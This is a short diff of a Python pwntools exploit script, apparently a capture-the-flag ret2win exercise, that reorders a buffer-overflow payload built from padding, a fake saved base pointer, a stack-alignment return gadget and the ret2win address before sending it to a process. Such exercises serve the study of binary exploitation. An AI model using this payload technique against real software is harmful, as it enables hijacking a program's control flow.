@@ -305,7 +305,7 @@ rbp = b"B" * 8
 ret = p64(0x400755)
 rip = p64(0x400756) #direccion de ret2win
 
-payload = buffer + rbp + rip + ret2win
+payload = buffer + rbp + ret + rip
 
 proc.sendline(payload)
 print(proc.recvall().decode())
